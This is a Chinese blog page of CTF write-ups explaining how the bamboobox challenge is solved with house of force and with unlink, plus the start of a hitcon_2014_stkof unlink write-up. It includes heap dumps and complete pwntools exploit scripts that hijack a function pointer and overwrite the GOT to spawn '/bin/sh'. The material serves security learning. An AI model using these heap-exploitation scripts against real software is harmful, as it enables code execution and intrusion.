  <div class="row">
	
	
		<blockquote>
<p>hitcontraining_bamboobox这道题有两种解题方式：</p>
<ol>
<li><p>house of force</p>
<p>参考：<a href="https://paper.seebug.org/521/#house-of-force" target="_blank" rel="noopener">house of force</a></p>
</li>
<li><p>unlink</p>
</li>
</ol>
</blockquote>
<h2 id="house-of-force（详解）"><a href="#house-of-force（详解）" class="headerlink" title="house of force（详解）"></a>house of force（详解）</h2><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><blockquote>
<p>只要top chunk size够大，就能随意申请chunk</p>
<p>所以，如果有溢出能控制top chunk size，就可以修改其为-1（0xffffffff最大值），然后malloc(负数)可以向上申请，malloc(正数)</p>
</blockquote>
<h3 id="题目流程"><a href="#题目流程" class="headerlink" title="题目流程"></a>题目流程</h3><p>程序一开始申请0x10的块，存放hello_message和goodbye_message的指针，而且最后在功能5中会调用goodbye_message。</p>
<p><img src="/2021/04/24/hitcontraining-bamboobox/image-20210424211521894.png" alt="image-20210424211521894"></p>
<p><img src="/2021/04/24/hitcontraining-bamboobox/image-20210424211735644.png" alt="image-20210424211735644"></p>
<p>所以，可以通过house of force修改top chunk size，然后将top chunk申请到v3里，修改v3的指针为后门函数magic的地址，然后即可get flag。</p>
<h3 id="详细过程"><a href="#详细过程" class="headerlink" title="详细过程"></a>详细过程</h3><h4 id="1-申请一个chunk"><a href="#1-申请一个chunk" class="headerlink" title="1.申请一个chunk"></a>1.申请一个chunk</h4><blockquote>
<p>为了不跟v3的大小0x10撞，选择0x30的大小。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x1a89000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x1a89020</span><br><span class="line">Size: 0x41</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x1a89060</span><br><span class="line">Size: 0x20fa1</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x1a89000</span><br><span class="line">0x1a89000:	0x0000000000000000	0x0000000000000021#v3</span><br><span class="line">0x1a89010:	0x0000000000400896	0x00000000004008b1#hello_message、goodbye_message</span><br><span class="line">0x1a89020:	0x0000000000000000	0x0000000000000041#申请的chunk</span><br><span class="line">0x1a89030:	0x0000000a61616161	0x0000000000000000</span><br><span class="line">0x1a89040:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1a89050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1a89060:	0x0000000000000000	0x0000000000020fa1#top chunk size</span><br><span class="line">0x1a89070:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x1a89080:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<h3 id="2-堆溢出修改top-chunk"><a href="#2-堆溢出修改top-chunk" class="headerlink" title="2.堆溢出修改top chunk"></a>2.堆溢出修改top chunk</h3><p>手动输入新top chunk为最大值0xffffffffffffffff（本质就是-1，但好像直接-1不太好使，，，）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xc32000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0xc32020</span><br><span class="line">Size: 0x41</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE | IS_MMAPED | NON_MAIN_ARENA</span><br><span class="line">Addr: 0xc32060</span><br><span class="line">Size: 0x-1	#成功修改为-1</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0xc32000</span><br><span class="line">0xc32000:	0x0000000000000000	0x0000000000000021	#v3（目的地址）</span><br><span class="line">0xc32010:	0x0000000000400896	0x00000000004008b1</span><br><span class="line">0xc32020:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0xc32030:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0xc32040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0xc32050:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0xc32060:	0x0000000000000000	0xffffffffffffffff	#chunk</span><br><span class="line">0xc32070:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<h4 id="3-向上申请到v3的地址"><a href="#3-向上申请到v3的地址" class="headerlink" title="3.向上申请到v3的地址"></a>3.向上申请到v3的地址</h4><p>向上申请块，需要malloc(负数)，负数 =  0xc32000 - 0xc32060 - 0x10 = -0x70（-112）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0xeae000	#成功修改chunk的位置</span><br><span class="line">Size: 0x59</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0xeae000</span><br><span class="line">0xeae000:	0x0000000000000000	0x0000000000000059#目的地址</span><br><span class="line">0xeae010:	0x0000000000400896	0x00000000004008b1</span><br><span class="line">0xeae020:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0xeae030:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0xeae040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0xeae050:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0xeae060:	0x0000000000000000	0x00ffffffffffffa1</span><br><span class="line">0xeae070:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<h4 id="4-申请一个块，填入内容magic"><a href="#4-申请一个块，填入内容magic" class="headerlink" title="4.申请一个块，填入内容magic"></a>4.申请一个块，填入内容magic</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x2034000</span><br><span class="line">Size: 0x21</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x2034020</span><br><span class="line">Size: 0x39</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x2034000</span><br><span class="line">0x2034000:	0x0000000000000000	0x0000000000000021</span><br><span class="line">0x2034010:	0x0000000000400d49	0x0000000000400d49	#修改成功</span><br><span class="line">0x2034020:	0x0000000000000000	0x0000000000000039</span><br><span class="line">0x2034030:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x2034040:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x2034050:	0x6161616161616161	0x6161616161616161</span><br><span class="line">0x2034060:	0x0000000000000000	0x00ffffffffffffa1</span><br><span class="line">0x2034070:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<h4 id="执行功能5"><a href="#执行功能5" class="headerlink" title="执行功能5"></a>执行功能5</h4><p>也就是会<code>v3[1]()</code>,v3[1]的地址已经被修改为magic的地址，故将执行后门函数magic()</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0xe bytes:</span><br><span class="line">    &#39;flag&#123;good_job&#125;&#39;</span><br><span class="line">flag&#123;good_job&#125;[*] Got EOF while reading in interactive</span><br></pre></td></tr></table></figure>

<h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./bamboobox'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x00400D49</span> </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">    p.sendline(str(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">    p.sendline(str(<span class="number">2</span>))</span><br><span class="line">    p.recvuntil(<span class="string">"length of item name:"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"name of item:"</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">    p.sendline(str(<span class="number">3</span>))</span><br><span class="line">    p.recvuntil(<span class="string">"index of item:"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"length of item name:"</span>)</span><br><span class="line">    p.sendline(str(len(content)))</span><br><span class="line">    p.recvuntil(<span class="string">"new name of the item:"</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">    p.sendline(str(<span class="number">4</span>))</span><br><span class="line">    p.recvuntil(<span class="string">"index of item:"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exit</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">    p.sendline(str(<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x30</span>,<span class="string">"aaaa"</span>)</span><br><span class="line">payload = <span class="string">"a"</span> * <span class="number">0x30</span></span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0xffffffffffffffff</span>)</span><br><span class="line">change(<span class="number">0</span>,payload)</span><br><span class="line">alloc(<span class="number">-112</span>,<span class="string">"aaaa"</span>)</span><br><span class="line">alloc(<span class="number">0x10</span>,p64(magic)*<span class="number">2</span>)</span><br><span class="line">exit()</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>





<h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><blockquote>
<p>unlink具体已经通过<a href="https://warm-winter.github.io/2021/04/20/hitcon-2014-stkof%E8%AF%A6%E8%A7%A3/" target="_blank" rel="noopener">hitcon_2014_stkof详解</a>学习了，但是做本题的时候，遇到了一些问题，，，记录下。</p>
<p>思路比较简单：</p>
<ol>
<li>unlink</li>
<li>修改chunk1指针为atoi_got</li>
<li>show打印atoi地址，计算system</li>
<li>edit修改stoi_got为system地址</li>
<li>重新启动的时候，发送’/bin/sh’即可执行atoi(输入的数据) =&gt; system(‘/bin/sh’)</li>
</ol>
</blockquote>
<h3 id="未解决的问题"><a href="#未解决的问题" class="headerlink" title="未解决的问题"></a>未解决的问题</h3><h4 id="1-target取值问题"><a href="#1-target取值问题" class="headerlink" title="1.target取值问题"></a>1.target取值问题</h4><p><code>target = 0x6020c8</code>可以</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;30gx 0x6020c0</span><br><span class="line">0x6020c0 &lt;itemlist&gt;:	0x0000000000000030	0x00000000006020b0</span><br><span class="line">0x6020d0 &lt;itemlist+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020e0 &lt;itemlist+32&gt;:	0x0000000000000030	0x00000000022e8100</span><br><span class="line">0x6020f0 &lt;itemlist+48&gt;:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<p>但是<code>target = 0x6020c8+0x10</code>会导致整个脚本不可用。</p>
<blockquote>
<p>难道是不能最后清零？</p>
</blockquote>
<h4 id="2-覆盖指针问题"><a href="#2-覆盖指针问题" class="headerlink" title="2.覆盖指针问题"></a>2.覆盖指针问题</h4><p>就很奇怪，不能用puts_got表（0x602020），同样报错，其他的可以，，，</p>
<h3 id="完整exp-1"><a href="#完整exp-1" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./bamboobox'</span>)</span><br><span class="line">p=remote(<span class="string">"node3.buuoj.cn"</span>,<span class="number">27073</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./bamboobox"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc-2.23.so"</span>)</span><br><span class="line"></span><br><span class="line">atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">    p.sendline(str(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">    p.sendline(str(<span class="number">2</span>))</span><br><span class="line">    p.recvuntil(<span class="string">"length of item name:"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">"name of item:"</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">    p.sendline(str(<span class="number">3</span>))</span><br><span class="line">    p.recvuntil(<span class="string">"index of item:"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">"length of item name:"</span>)</span><br><span class="line">    p.sendline(str(len(content)))</span><br><span class="line">    p.recvuntil(<span class="string">"new name of the item:"</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">    p.sendline(str(<span class="number">4</span>))</span><br><span class="line">    p.recvuntil(<span class="string">"index of item:"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x30</span>,<span class="string">"aaaa"</span>)</span><br><span class="line">alloc(<span class="number">0x80</span>,<span class="string">"bbbb"</span>)</span><br><span class="line">alloc(<span class="number">0x30</span>,<span class="string">"cccc"</span>)</span><br><span class="line"></span><br><span class="line">target = <span class="number">0x6020c8</span>   <span class="comment">#not be last</span></span><br><span class="line">fd = target - <span class="number">0x18</span></span><br><span class="line">bk = target - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x30</span>)</span><br><span class="line">payload += p64(fd) + p64(bk)</span><br><span class="line">payload += <span class="string">"a"</span>*<span class="number">0x10</span></span><br><span class="line">payload += p64(<span class="number">0x30</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">change(<span class="number">0</span>,payload)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment"># x/30gx 0x6020c8</span></span><br><span class="line"></span><br><span class="line">payload = p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line"><span class="comment"># print(hex(puts_got))</span></span><br><span class="line">payload += p64(<span class="number">0x30</span>) + p64(atoi_got)</span><br><span class="line"></span><br><span class="line">change(<span class="number">0</span>,payload)</span><br><span class="line">show()</span><br><span class="line">atoi_addr = u64(p.recvuntil(<span class="string">"\x7f"</span>)[<span class="number">-6</span>:]+<span class="string">'\x00\x00'</span>)</span><br><span class="line">log.success(hex(atoi_addr))</span><br><span class="line"></span><br><span class="line">libc_base = atoi_addr - libc.sym[<span class="string">'atoi'</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">payload = p64(system)</span><br><span class="line">change(<span class="number">0</span>,payload)</span><br><span class="line">p.recvuntil(<span class="string">"Your choice:"</span>)</span><br><span class="line">p.sendline(<span class="string">"/bin/sh\x00"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<blockquote>
<p>其实这道题比<a href="https://warm-winter.github.io/2021/04/20/hitcon-2014-stkof%E8%AF%A6%E8%A7%A3/#" target="_blank" rel="noopener">hitcon_2014_stkof详解</a>这道题要简单，，，给了打印函数，可以直接show出来地址（无须构造puts），覆盖atoi方便，因为程序开头有atoi（输入八字节）的操作，只要覆盖atoi_got表为system地址即可get shell。</p>
</blockquote>

	
	</div>
  <a type="button" href="/2021/04/24/hitcontraining-bamboobox/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2021/04/20/hitcon-2014-stkof详解/" >hitcon_2014_stkof详解</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2021-04-20  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<blockquote>
<p>本文主要列出hitcon2014_stkof的详细过程</p>
<p>主要参考：<a href="https://bbs.pediy.com/thread-247007.htm" target="_blank" rel="noopener">unlink 系列</a></p>
</blockquote>
<h3 id="程序流程"><a href="#程序流程" class="headerlink" title="程序流程"></a>程序流程</h3><ol>
<li><p>allocate：分配一个指定size大小的块，返回idx。</p>
<p>其中块的指针信息保存在一个全局变量0x602140中</p>
</li>
<li><p>fill：根据idx找到对应的块，重新给定大小size，读入内容content</p>
</li>
<li><p>free：释放idx的块</p>
</li>
</ol>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><ol>
<li>由于fill时候的size可以重新制定，可以造成堆溢出。</li>
<li>没有打印函数</li>
<li>有一个全局变量</li>
</ol>
<p>方法：unlink</p>
<ol>
<li>unlink，控制全局变量内容</li>
<li>修改chunk1指针为free_got，修改got表内容为puts_plt</li>
<li>修改chunk2指针为puts_got，这样，free(2)即可打印puts地址</li>
<li>计算system和binsh</li>
<li>同2，修改got表内容为system，对未使用的chunk4填入‘binsh’</li>
<li>free(4)即可get_shell</li>
</ol>
<h3 id="详细过程"><a href="#详细过程" class="headerlink" title="详细过程"></a>详细过程</h3><h4 id="0-tip（setbuf）"><a href="#0-tip（setbuf）" class="headerlink" title="0.tip（setbuf）"></a>0.tip（setbuf）</h4><p>setbuf()/setvbuf()函数作用：关闭I/O缓冲区</p>
<p>一般为了让程序显示正常，会关闭I/O缓冲区</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">setbuf(stdin ,<span class="number">0</span>);</span><br><span class="line">setbuf(stdout,<span class="number">0</span>);</span><br><span class="line">setbuf(stderr,<span class="number">0</span>);</span><br></pre></td></tr></table></figure>

<p>但是本题没有关闭缓冲区，<strong>函数运行开始阶段在fgets()函数以及printf()函数运行的时候，会malloc()两块内存区域</strong>。 </p>
<h4 id="1-保护"><a href="#1-保护" class="headerlink" title="1.保护"></a>1.保护</h4><blockquote>
<p>没开pie，Partial RELRO，可以修改got表内容。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">winter@ubuntu:~&#x2F;buu$ checksec stkof</span><br><span class="line">[*] &#39;&#x2F;home&#x2F;winter&#x2F;buu&#x2F;stkof&#39;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>

<h4 id="2-申请四个块"><a href="#2-申请四个块" class="headerlink" title="2.申请四个块"></a>2.申请四个块</h4><blockquote>
<p>由于为关闭缓冲区，故程序中多出输入缓冲区和输出缓冲区。</p>
<p>第一个chunk，由于会加在输入输出缓冲区之间，后续无用。</p>
<p>第二个chunk，为了unlink前向合并</p>
<p>第三个chunk，大小非fastbin</p>
<p>第四个chunk，一个开始阶段不被改变的chunk，用于最后填入的‘/bin/sh’。</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x20f7000</span><br><span class="line">Size: 0x1011</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x20f8010</span><br><span class="line">Size: 0x31</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x20f8040</span><br><span class="line">Size: 0x411</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x20f8450</span><br><span class="line">Size: 0x41</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x20f8490</span><br><span class="line">Size: 0x91</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x20f8520</span><br><span class="line">Size: 0x31</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x20f8550</span><br><span class="line">Size: 0x20ab1</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x&#x2F;50gx 0x20f8450</span><br><span class="line">0x20f8450:	0x0000000000000000	0x0000000000000041</span><br><span class="line">0x20f8460:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8470:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8480:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8490:	0x0000000000000000	0x0000000000000091</span><br><span class="line">0x20f84a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84d0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84e0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f84f0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8500:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8510:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8520:	0x0000000000000000	0x0000000000000031</span><br><span class="line">0x20f8530:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8540:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8550:	0x0000000000000000	0x0000000000020ab1</span><br><span class="line">0x20f8560:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x20f8570:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>

<blockquote>
<p>全局变量的情况，申请四个chunk的首地址记录在里面。</p>
</blockquote>
